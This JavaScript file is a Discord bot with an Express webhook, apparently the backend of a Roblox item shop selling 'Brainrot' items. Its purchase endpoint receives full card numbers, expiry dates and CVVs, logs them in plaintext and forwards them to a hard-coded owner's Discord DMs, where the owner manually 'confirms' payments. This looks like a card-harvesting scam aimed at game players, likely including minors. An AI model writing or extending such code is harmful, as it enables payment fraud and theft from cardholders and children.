const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const express = require('express');
const bodyParser = require('body-parser');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.DirectMessages,     // Important for DMs
    GatewayIntentBits.MessageContent,
  ]
});

const app = express();
app.use(bodyParser.json());

const OWNER_ID = '1280339014033080442';

// CHANGE THIS TO YOUR ACTUAL STORE URL FROM RAILWAY
const STORE_URL = 'https://obsidianx-shop.up.railway.app';   // ←←← UPDATE THIS

client.once('ready', () => {
  console.log(`✅ Bot online as ${client.user.tag}`);
});

app.post('/purchase-complete', async (req, res) => {
  const data = req.body || {};
  const { name = 'Unknown', receipt, username, paymentType, cardDetails } = data;

  console.log('📩 Purchase received:', data);

  const embed = new EmbedBuilder()
    .setColor(0xff4d4d)
    .setTitle('🛒 New Brainrot Purchase')
    .setDescription(`Someone has just looked into buying **${name}** and completed the form.\n\nConfirm if the payment went through.`)
    .addFields(
      { name: 'Receipt', value: receipt || 'N/A', inline: true },
      { name: 'Roblox Username', value: username || 'Unknown', inline: true },
      { name: 'Payment', value: paymentType === 'robux' ? 'Robux' : 'Visa Prepaid', inline: true }
    )
    .setTimestamp();

  if (paymentType === 'visa' && cardDetails) {
    embed.addFields({ name: 'Card Info', value: `Card: ${cardDetails.cardNumber || 'N/A'}\nExpiry: ${cardDetails.expiry || 'N/A'}\nCVV: ${cardDetails.cvv || 'N/A'}`, inline: false });
  }

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_${data.id || 'unknown'}`).setLabel('✅ Confirm & Delete').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`decline_${data.id || 'unknown'}`).setLabel('❌ Decline').setStyle(ButtonStyle.Danger)
  );

  try {
    const user = await client.users.fetch(OWNER_ID);
    await user.send({ embeds: [embed], components: [row] });
    console.log('✅ DM with buttons sent successfully');
  } catch (err) {
    console.error('❌ Failed to send DM:', err.message);
  }

  res.json({ success: true });
});

// Button handler
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  const [action, itemId] = interaction.customId.split('_');

  if (action === 'confirm') {
    try {
      await fetch(`${STORE_URL}/delete/${itemId}`, { method: 'DELETE' });
      await interaction.update({
        content: `✅ Confirmed! Brainrot has been **deleted** from the store.`,
        components: []
      });
    } catch (e) {
      await interaction.update({ content: '❌ Failed to delete item from store.', components: [] });
    }
  } else if (action === 'decline') {
    await interaction.update({
      content: `❌ Purchase declined.`,
      components: []
    });
  }
});

const TOKEN = process.env.DISCORD_TOKEN;
if (!TOKEN) {
  console.error("❌ DISCORD_TOKEN missing in Railway variables!");
  process.exit(1);
}

client.login(TOKEN).catch(e => {
  console.error("❌ Login failed:", e.message);
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`🚀 Webhook listening on port ${PORT}`));
